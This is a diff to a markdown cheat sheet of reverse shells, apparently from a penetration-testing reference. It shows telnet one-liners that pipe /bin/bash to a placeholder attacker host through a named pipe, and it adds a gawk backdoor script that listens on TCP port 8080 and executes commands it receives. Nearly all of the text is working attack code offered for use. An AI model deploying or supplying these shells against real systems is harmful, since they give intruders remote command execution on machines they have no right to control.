@@ -77,3 +77,26 @@ You’ll need to authorise the target to connect to you (command also run on you
 > - rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 >
 > - telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+
+## GAWK Reverse Shells
+
+>  #!/usr/bin/gawk -f
+>
+> BEGIN { <br>
+>        Port    =       8080 <br>
+>        Prompt  =       "bkd> " <br>
+
+>        Service = "/inet/tcp/" Port "/0/0" <br>
+>        while (1) { <br>
+>                do { <br>
+>                        printf Prompt |& Service <br>
+>                        Service |& getline cmd <br>
+>                        if (cmd) { <br>
+>                                while ((cmd |& getline) > 0) <br>
+>                                        print $0 |& Service <br>
+>                                close(cmd) <br>
+>                        } <br>
+>                } while (cmd != "exit") <br>
+>                close(Service) <br>
+>        } <br>
+> }
